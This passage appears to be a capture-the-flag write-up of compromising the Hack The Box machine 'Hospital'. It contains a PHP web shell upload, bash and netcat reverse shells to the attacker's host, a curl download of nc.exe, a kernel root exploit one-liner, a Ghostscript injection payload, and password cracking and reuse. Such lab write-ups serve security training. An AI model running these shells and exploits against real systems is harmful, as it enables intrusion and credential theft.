The upload form attempts to limit files to images. This was found to only use client side validation and was easily bypassed using Firefox dev tools.

### User controlled content served

Files uploaded by the user are stored in the web root under the `/uploads/` directory using a predictable file name.

## Exploitation

PHP is used on the server listening on port 8080. The tester knows this by the filename extension of the URLs, `index.php`, `login.php`, etc. 

The tester tried to execute a common PHP web shell named `predator.php`. 
1. Login to [http://hospital.htb:8080](http://hospital.htb:8080)
2. Use the Firefox dev tools to remove the image validation
3. Upload the `predator.php` web shell
4. Attempt to execute using [http://hospital:8080/uploads/predator.php](http://hospital:8080/uploads/predator.php)


![](/assets/attachments/Pasted%20image%2020240611055514.png)

The upload failed. There is some server side validation, but the tester is not given indication what is being checked. There is another file format that could give PHP execution. PHP defines the `phar` archive format. Files may be referenced inside the archive without unpacking it. 

The tool `phar` comes with the PHP install.

```shell
$ phar pack -f shell.phar predator.php
```

The upload was successful.

![](/assets/attachments/Pasted%20image%2020240611060510.png)

The tester tried code execution using the URL `http://hospital.htb:8080/uploads/shell.phar/predator.php`. The exploit was successful.


![](/assets/attachments/Pasted%20image%2020240611060855.png)

Occasionally the web server will remove content from the `/uploads/` directory. The tester used the Requestor feature of ZAP to replay the file upload.

![](/assets/attachments/Pasted%20image%2020240611062223.png)

![](/assets/attachments/Pasted%20image%2020240611062309.png)

A reverse bash shell was attempted.

On the attacking host, run the listener:
```shell
$ nc -nlvp 9090

```

Enter the command `/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.108/9090 0>&1'` into the `System Shell` prompt and click `Enter`.

![](/assets/attachments/Pasted%20image%2020240611061828.png)

```shell
$ nc -lvnp 9090
listening on [any] 9090 ...
connect to [10.10.14.108] from (UNKNOWN) [10.129.134.145] 6588
bash: cannot set terminal process group (985): Inappropriate ioctl for device
bash: no job control in this shell
www-data@webserver:/var/www/html/uploads$
```

The tester stabilized the shell by opening bash in a tty and preventing Ctrl-C from terminating the `nc` command.

```shell
www-data@webserver:/var/www/html/uploads$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<ds$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@webserver:/var/www/html/uploads$ export TERM=xterm-256color
export TERM=xterm-256color
www-data@webserver:/var/www/html/uploads$ ^Z
zsh: suspended  nc -lvnp 9090
$ stty raw -echo ; fg ; reset
[1]  + continued  nc -lvnp 9090 ^M

www-data@webserver:/var/www/html/uploads$
```

## Discovery

The tester gathered operating system information.

```shell
www-data@webserver:/var/www/html$ cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=23.04
DISTRIB_CODENAME=lunar
DISTRIB_DESCRIPTION="Ubuntu 23.04"
PRETTY_NAME="Ubuntu 23.04"
NAME="Ubuntu"
VERSION_ID="23.04"
VERSION="23.04 (Lunar Lobster)"
VERSION_CODENAME=lunar
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=lunar
LOGO=ubuntu-logo

www-data@webserver:/var/www/html$ uname -a
Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

The users with a login shell:
```
www-data@webserver:/var/www/html$ grep -v nologin  /etc/passwd | grep -v /bin/false

root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
drwilliams:x:1000:1000:Lucy Williams:/home/drwilliams:/bin/bash
```

One of the targets in scope is a user flag. The `drwilliams` user may be the target user, or provide more information to reach the target user.

The non-kernel processes:

```shell
www-data@webserver:/var/www/html$ ps -ef | grep .

root         403       1  0 18:27 ?        00:00:00 /lib/systemd/systemd-udevd
systemd+     574       1  0 18:27 ?        00:00:00 /lib/systemd/systemd-networkd
systemd+     581       1  0 18:27 ?        00:00:00 /lib/systemd/systemd-resolved
systemd+     582       1  0 18:27 ?        00:00:00 /lib/systemd/systemd-timesyncd
message+     626       1  0 18:27 ?        00:00:00 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root         633       1  0 18:27 ?        00:00:00 /usr/libexec/polkitd --no-debug
root         636       1  0 18:27 ?        00:00:01 /usr/lib/snapd/snapd
root         638       1  0 18:27 ?        00:00:00 /lib/systemd/systemd-logind
root         639       1  0 18:27 ?        00:00:00 /usr/libexec/udisks2/udisksd
root         669       1  0 18:27 ?        00:00:00 /usr/sbin/ModemManager
mysql        749       1  0 18:27 ?        00:00:00 /usr/sbin/mariadbd
root         767       1  0 18:27 ?        00:00:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
syslog       824       1  0 18:27 ?        00:00:00 /usr/sbin/rsyslogd -n -iNONE
root         963       1  0 18:27 ?        00:00:00 /usr/sbin/cron -f -P
root         968       1  0 18:27 tty1     00:00:00 /sbin/agetty -o -p -- \u --noclear - linux
root         985       1  0 18:27 ?        00:00:00 /usr/sbin/apache2 -k start
www-data     986     985  0 18:27 ?        00:00:00 /usr/sbin/apache2 -k start
www-data     987     985  0 18:27 ?        00:00:00 /usr/sbin/apache2 -k start
www-data     988     985  0 18:27 ?        00:00:00 /usr/sbin/apache2 -k start
www-data     989     985  0 18:27 ?        00:00:00 /usr/sbin/apache2 -k start
www-data     990     985  0 18:27 ?        00:00:00 /usr/sbin/apache2 -k start
root        1118       2  0 18:32 ?        00:00:00 [kworker/0:0-events]
www-data    1125     985  0 18:36 ?        00:00:00 /usr/sbin/apache2 -k start
www-data    1154     988  0 18:37 ?        00:00:00 sh -c /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.108/9090 0>&1'
www-data    1155    1154  0 18:37 ?        00:00:00 /bin/bash -c /bin/bash -i >& /dev/tcp/10.10.14.108/9090 0>&1
www-data    1156    1155  0 18:37 ?        00:00:00 /bin/bash -i
www-data    1158    1156  0 18:39 ?        00:00:00 python3 -c import pty; pty.spawn("/bin/bash")
www-data    1159    1158  0 18:39 pts/0    00:00:00 /bin/bash
root        1213       2  0 18:39 ?        00:00:01 [kworker/0:1-events]
root        1233       2  0 18:50 ?        00:00:00 [kworker/u256:2-events_unbound]
```

MariaDB (a.k.a. MySQL) is running.

The tester investigated the web root. PHP applications typically have a configuration file close to the web root.
```shell
www-data@webserver:/var/www/html$ cd ..
www-data@webserver:/var/www/html$ ls
config.php  fonts      js          register.php  uploads
css         images     login.php   success.php   vendor
failed.php  index.php  logout.php  upload.php
www-data@webserver:/var/www/html$ cat config.php 
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'my$qls3rv1c3!');
define('DB_NAME', 'hospital');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
www-data@webserver:/var/www/html$ 
```

There are database credentials. The tester accessed the database to look for useful information.

```
www-data@webserver:/var/www/html$ mysql -u root -p hospital
Enter password: 
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 12
Server version: 10.11.2-MariaDB-1 Ubuntu 23.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [hospital]> show tables;
+--------------------+
| Tables_in_hospital |
+--------------------+
| users              |
+--------------------+
1 row in set (0.000 sec)

MariaDB [hospital]> select * from users;
+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
|  1 | admin    | $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2 | 2023-09-21 14:46:04 |
|  2 | patient  | $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO | 2023-09-21 15:35:11 |
|  3 | btone    | $2y$10$dJ3vVGlMMQ2n.aMUWmgMDO.XmZpLyNX9Tssz7PDGFu3rcXoaBNRTO | 2024-06-11 18:36:55 |
+----+----------+--------------------------------------------------------------+---------------------+
3 rows in set (0.000 sec)
```

The tester found hashed passwords. Password re-use is a common problem, so the tester attempted to crack the passwords using `john`.

```shell
$ cat hashes
admin:$2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2
patient:$2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO

$ john --wordlist=/home/kali/Public/rockyou.txt hashes 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123456           (admin)     
patient          (patient)     
2g 0:00:05:09 DONE (2024-06-11 09:41) 0.006472g/s 173.0p/s 173.1c/s 173.1C/s pepsie..nate12
```

- `admin:123456`
- `patient:patient`

## Vulnerabilities

### Linux 5.19.0-35-generic

This version of the Linux kernel is older. The tester searched using terms `Linux 5.19.0 cve poc` and found the following exploit:

[https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)

The URL for downloading the exploit is [https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh](https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh).

The exploit is small and can be brought to the target using copy and paste.
```shell
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

## Exploitation

The tester tried to re-use the passwords from the MariaDB to access the `drwilliams` account.

```shell
www-data@webserver:/var/www/html/uploads$ su drwilliams
Password: 123456
su: Authentication failure
www-data@webserver:/var/www/html/uploads$ 
www-data@webserver:/var/www/html/uploads$ su drwilliams
Password: patient
su: Authentication failure
www-data@webserver:/var/www/html/uploads$ 
```

The tester pursued the kernel exploit.
```shell
www-data@webserver:/var/www/html/uploads$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'

root@webserver:/var/tmp# whoami
root
```

The tester checked the home directories for the target flag and did not find it.

```shell
root@webserver:/root# cd /home
root@webserver:/home# ls
drwilliams
root@webserver:/home# ls drwilliams
go
```

## Discovery

Now that the tester has root in the Ubuntu install, a search for credentials for user `drwilliams` can be pursued further.

The password hashes for Linux users are stored in `/etc/shadow`. The tester found the following entry for `drwilliams`:
```
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
```

## Vulnerabilities

The tester attempted to crack the passwords using `john`. If possible, this is a weak password vulnerability.

```shell
$ cat hashes2
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/

$ john --wordlist=/home/kali/Public/rockyou.txt hashes2
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
qwe123!@#        (drwilliams)     
1g 0:00:00:33 DONE (2024-06-11 12:49) 0.02990g/s 6407p/s 6407c/s 6407C/s rufus11..pucci
```
- `drwilliams:qwe123!@#`

## Exploitation

The Roundcube webmail application hasn't been enumerated far, the tester decided to try the password there.

![](/assets/attachments/Pasted%20image%2020240611133937.png)

The credentials work.

![](/assets/attachments/Pasted%20image%2020240611134024.png)

## Discovery

The tester began discovery of the webmail application.

The About link confirms the Roundcube version: 1.6.4.

![](/assets/attachments/Pasted%20image%2020240611141353.png)

The unread email references a program called `GhostScript` that processes `.eps` files.

![](/assets/attachments/Pasted%20image%2020240611134517.png)

The tester visited the "Sent" and "Trash" folders and they were empty.

## Vulnerabilities

No CVEs were found for Roundcube 1.6.4 at the time of the test.

### CVE-2023-36664

The email indicates an `.eps` file will be processed by GhostScript. Searching for GhostScript vulnerabilities found CVE-2023-36664. An exploit exists at https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection.

## Exploitation

The exploit allows the tester to run arbitrary commands. A reverse shell is ideal. The tester performed two exploits. One to upload the NetCat program (`nc.exe`) and a second to invoke it.

Hosting the payload requires a web server on the attacking machine.
```shell
$ python3 -m http.server 8090
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/) ...
```

The tester used NetCat on the attacking machine to receive the shell.
```shell
$ nc -lvnp 9090
Listening on [any] 9090 ...

```

The tester downloaded the exploit, generated the first payload, and attached to a reply on the target machine.

```shell
$ git clone https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection.git

$ cd CVE-2023-36664-Ghostscript-command-injection

$ python3 ~/Workspace/CVE-2023-36664-Ghostscript-command-injection/CVE_2023_36664_exploit.py --generate --payload "curl -o nc.exe http://10.10.14.108:8090/nc.exe" --filename shell2a --extension eps
```

![](/assets/attachments/Pasted%20image%2020240611160152.png)

After about a minute, the payload executed:
```shell
$ python3 -m http.server 8090                                                                                                                
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/) ...
10.129.166.255 - - [11/Jun/2024 16:02:24] "GET /nc.exe HTTP/1.1" 200 -
```

The tester generated the second payload, and attached to a reply on the target machine.
```shell
$ python3 ~/Workspace/CVE-2023-36664-Ghostscript-command-injection/CVE_2023_36664_exploit.py --generate --payload "nc.exe 10.10.14.108 9090 -e cmd.exe" --filename shell2b --extension eps
```
![](/assets/attachments/Pasted%20image%2020240611160434.png)

After about a minute, the payload executed

```shell
$ nc -lvnp 9090
listening on [any] 9090 ...
connect to [10.10.14.108] from (UNKNOWN) [10.129.166.255] 6149
Microsoft Windows [Version 10.0.17763.4974]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\drbrown.HOSPITAL\Documents>
```

## Discovery

The tester now had a shell in the Windows installation. Time to gather user and system information.

```
Microsoft Windows [Version 10.0.17763.4974]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\drbrown.HOSPITAL\Documents>whoami
whoami
hospital\drbrown

C:\Users\drbrown.HOSPITAL\Documents>whoami /all
whoami /all

USER INFORMATION
----------------

User Name        SID                                           
================ ==============================================
hospital\drbrown S-1-5-21-4208260710-2273545631-1523135639-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes                                        
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users                Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Log Users               Alias            S-1-5-32-559 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

ERROR: Unable to get user claims information.
```

In the current working directory of the shell, a Windows batch file running GhostScript was found. The tester determined the version of GhostScript is 10.01.1.

```
C:\Users\drbrown.HOSPITAL\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 7357-966F

 Directory of C:\Users\drbrown.HOSPITAL\Documents

06/11/2024  09:02 PM    <DIR>          .
06/11/2024  09:02 PM    <DIR>          ..
10/23/2023  03:33 PM               373 ghostscript.bat
06/11/2024  09:02 PM            59,392 nc.exe
               2 File(s)         59,765 bytes
               2 Dir(s)   4,179,574,784 bytes free

C:\Users\drbrown.HOSPITAL\Documents>type ghostscript.bat
type ghostscript.bat
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
C:\Users\drbrown.HOSPITAL\Documents>

*Evil-WinRM* PS C:\Users\drbrown.HOSPITAL\Documents> cd "/Program Files/gs/gs10.01.1/bin"
*Evil-WinRM* PS C:\Program Files\gs\gs10.01.1\bin> .\gswin64c.exe
GPL Ghostscript 10.01.1 (2023-03-27)
Copyright (C) 2023 Artifex Software, Inc.  All rights reserved.
This software is supplied under the GNU AGPLv3 and comes with NO WARRANTY:
see the file COPYING for details.
GS>
```

The user is `drbrown`. `chr!$br0wn` is the Windows account password. The tester tried these credentials to authenticate with the WinRM service on port 5985 from the attacking machine.

```shell
$ evil-winrm -i hospital.htb -u drbrown -p 'chr!$br0wn'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\drbrown.HOSPITAL\Documents> whoami
hospital\drbrown
```

## Persistence

The tester has found and verified another set of credentials and a simple means of restoring access if the shells are lost. Access to the `drbrown` account may be obtained using the following command:
```shell
$ evil-winrm -i hospital.htb -u drbrown -p 'chr!$br0wn'

...

*Evil-WinRM* PS C:\Users\drbrown.HOSPITAL\Documents>
```

The tester continued discovery by enumerating files in the home directory of `drbrown`.

```
*Evil-WinRM* PS C:\Users\drbrown.HOSPITAL> gci -file -recurse
...

	Directory: C:\Users\drbrown.HOSPITAL\Desktop
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/11/2024   3:57 PM             34 user.txt

...

C:\Users\Administrator\Desktop>ipconfig
ipconfig

Windows IP Configuration

Ethernet adapter vEthernet (Switch01):

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::3488:527f:9c75:ed51%14
   IPv4 Address. . . . . . . . . . . : 192.168.5.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::35
   IPv6 Address. . . . . . . . . . . : dead:beef::4a28:1d71:f91c:e791
   Link-local IPv6 Address . . . . . : fe80::956f:627e:2e13:326a%12
   IPv4 Address. . . . . . . . . . . : 10.129.166.255
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:2bb5%12
                                       10.129.0.1
```

The tester found the `user.txt` goal.

The entirety of file system exploration will not be shown for sake of space.

## Vulnerability

The tester found an important directory that is writeable by `drbrown`.

```
*Evil-WinRM* PS C:\xampp\htdocs> icacls .
. NT AUTHORITY\LOCAL SERVICE:(OI)(CI)(F)
  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
  BUILTIN\Administrators:(I)(OI)(CI)(F)
  BUILTIN\Users:(I)(OI)(CI)(RX)
  BUILTIN\Users:(I)(CI)(AD)
  BUILTIN\Users:(I)(CI)(WD)
  CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```

The tester has already discovered the Windows web server is running PHP. The web server root is writeable, a PHP file such as `predator.php` used before can be placed here to get access with the user running the web server. On Windows, this is typically a service account.

## Exploitation

The tester using `evil-winrm` to upload the `predator.php` file into the web server document root.

```
*Evil-WinRM* PS C:\Users\drbrown.HOSPITAL\Documents> cd \xampp\htdocs
*Evil-WinRM* PS C:\xampp\htdocs> upload Public/predator.php

Info: Uploading /home/kali/Public/predator.php to C:\xampp\htdocs\predator.php

Data: 58272 bytes of 58272 bytes copied

Info: Upload successful!
```

The tester open the browser to [https://hospital.htb/predator.php](https://hospital.htb/predator.php)

![](/assets/attachments/Pasted%20image%2020240611162334.png)

The web server is running as SYSTEM, it should be using a dedicate system account with restricted privileges.

To obtain a shell, the tester uploaded `nc.exe` using `evil-winrm`.
```
*Evil-WinRM* PS C:\xampp\htdocs> upload Public/nc.exe

Info: Uploading /home/kali/Public/nc.exe to C:\xampp\htdocs\nc.exe

Data: 79188 bytes of 79188 bytes copied

Info: Upload successful!
```

The previous payload of `nc.exe 10.10.14.108 9090 -e cmd.exe` was executed using the web shell.

![](/assets/attachments/Pasted%20image%2020240611162654.png)

```
$ nc -lvnp 9090
listening on [any] 9090 ...
connect to [10.10.14.108] from (UNKNOWN) [10.129.166.255] 6308
Microsoft Windows [Version 10.0.17763.4974]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs>whoami
whoami
nt authority\system
```

The tester knows the `root.txt` has a usual place.

```
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 7357-966F

 Directory of C:\Users\Administrator\Desktop

10/27/2023  12:29 AM    <DIR>          .
10/27/2023  12:29 AM    <DIR>          ..
06/11/2024  03:57 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   4,178,132,992 bytes free

C:\Users\Administrator\Desktop>ipconfig
ipconfig

Windows IP Configuration

Ethernet adapter vEthernet (Switch01):

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::3488:527f:9c75:ed51%14
   IPv4 Address. . . . . . . . . . . : 192.168.5.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::35
   IPv6 Address. . . . . . . . . . . : dead:beef::4a28:1d71:f91c:e791
   Link-local IPv6 Address . . . . . : fe80::956f:627e:2e13:326a%12
   IPv4 Address. . . . . . . . . . . : 10.129.166.255
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:2bb5%12
                                       10.129.0.1
```

The tester found the `root.txt` goal.

Hospital has been fully compromised.

# Appendix

## Tool Versions

| Tool         | Version                           | Source                                                                                                                                                             |
| ------------ | --------------------------------- |--------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Kali Linux   | 2024.2                            | [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)                                                                                                   |
| ZAP          | Weekly 2024-05-20                 | [https://www.zaproxy.org/download/](https://www.zaproxy.org/download/)                                                                                             |
| Firefox      | 115.11.0esr                       | [https://mozilla.org](https://mozilla.org)                                                                                                                         |
| predator.php | git hash de08fbc                  | [https://github.com/JohnTroony/php-webshells/blob/master/Collection/Predator.php](https://github.com/JohnTroony/php-webshells/blob/master/Collection/Predator.php) |
| curl         | 8.7.1                             | Kali Linux package manager                                                                                                                                         |
| nc           | v1.10-48.1                        | Kali Linux package manager                                                                                                                                         |
| nc.exe       | windows-resources 0.6.10          | Kali Linux package manager                                                                                                                                         |
| john         | 1.9.0-jumbo-1+bleeding-aec1328d6c | Kali Linux package manager                                                                                                                                         |
| evil-winrm   | v3.5                              | Kali Linux package manager                                                                                                                                         |
